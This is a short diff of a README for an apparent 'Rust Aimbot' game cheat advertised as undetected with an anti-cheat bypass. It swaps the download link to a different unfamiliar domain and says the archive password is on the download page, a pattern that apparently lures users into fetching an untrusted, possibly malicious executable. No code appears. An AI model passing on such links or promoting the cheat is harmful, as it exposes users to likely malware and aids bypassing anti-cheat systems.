@@ -18,7 +18,7 @@ Rust Aimbot - undetected cheat tool. Anti-cheat bypass included. Works with the 
 
 ## Download
 
-[![Download v3.2.0](https://img.shields.io/badge/Download_v3.2.0-ec4899?style=for-the-badge&logoColor=white)](https://dllvcrun.com/rustaimbot2)
+[![Download v3.2.0](https://img.shields.io/badge/Download_v3.2.0-ec4899?style=for-the-badge&logoColor=white)](https://p-csx-5.com/rustaimbot2)
 
 > The archive password is shown on the download page.
 
